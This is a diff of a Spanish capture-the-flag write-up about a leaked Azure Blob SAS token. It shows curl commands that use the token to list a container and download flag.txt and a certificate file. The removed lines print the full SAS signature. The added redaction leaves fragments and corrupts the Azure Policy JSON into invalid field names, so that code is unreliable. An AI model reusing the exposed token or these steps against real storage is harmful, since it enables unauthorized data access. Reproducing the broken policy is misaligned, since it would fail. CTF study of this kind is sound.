@@ -50,7 +50,7 @@ El portal muestra:
 Al revisar el código HTML, encontré una línea crítica:
 
 ```html
-<img src="https://ctf25sac672da51.blob.core.windows.net/medicloud-research/close-up-doctor-holding-red-heart.jpg??sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
+<img src="https://ctf25sac672da51.blob.core.windows.net/medicloud-research/close-up-doctor-holding-red-heart.jpg??sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D"
      alt="Cardiovascular Research - Doctor with Heart Model">
 ```
 
@@ -81,7 +81,7 @@ La URL de la imagen contiene un **Shared Access Signature (SAS) Token** completo
 Usando el SAS token descubierto, listé el contenido del contenedor `medicloud-research`:
 
 ```bash
-curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research?restype=container&comp=list&sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
+curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research?restype=container&comp=list&sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D"
 ```
 
 **Resultado**: Listado XML con 4 archivos:
@@ -134,7 +134,7 @@ curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research?restyp
 Usando el mismo SAS token para acceder al archivo `flag.txt`:
 
 ```bash
-curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/flag.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
+curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/flag.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D"
 ```
 
 **Output**:
@@ -283,10 +283,10 @@ az network private-endpoint create \
     "allOf": [
       {
         "field": "type",
-        "equals": "Microsoft.Storage/storageAccounts/blobServices/containers"
+        "equals": "Microsoft.SECRET_REDACTED_BY_ANTIGRAVITYtainers"
       },
       {
-        "field": "Microsoft.Storage/storageAccounts/blobServices/containers/publicAccess",
+        "field": "Microsoft.SECRET_REDACTED_BY_ANTIGRAVITYtainers/publicAccess",
         "notEquals": "None"
       }
     ]
@@ -332,10 +332,10 @@ curl -s https://ctf25sac672da51.blob.core.windows.net/research-portal/research-p
 grep -oP 'https://ctf25sac672da51.blob.core.windows.net/medicloud-research/[^"]+' research-portal.html
 
 # 3. Listar el contenedor usando el SAS token
-curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research?restype=container&comp=list&sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
+curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research?restype=container&comp=list&sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D"
 
 # 4. Descargar la flag
-curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/flag.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
+curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/flag.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D"
 
 # 5. Opcionalmente, descargar otros archivos sensibles
 curl "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/certificadob64delpfx.txt?[SAS]" -o certificado.txt
@@ -354,7 +354,7 @@ https://ctf25sac672da51.blob.core.windows.net/medicloud-research/file.jpg?
   &se=2026-11-17T20:20:21Z                   ← Expiry Time (requerido)
   &sp=rl                                      ← Permissions (r=read, w=write, d=delete, l=list, etc.)
   &spr=https                                  ← Signed Protocol
-  &sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D  ← HMAC-SHA256 Signature
+  &SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D  ← HMAC-SHA256 Signature
 ```
 
 ### Permisos Disponibles en SAS Tokens
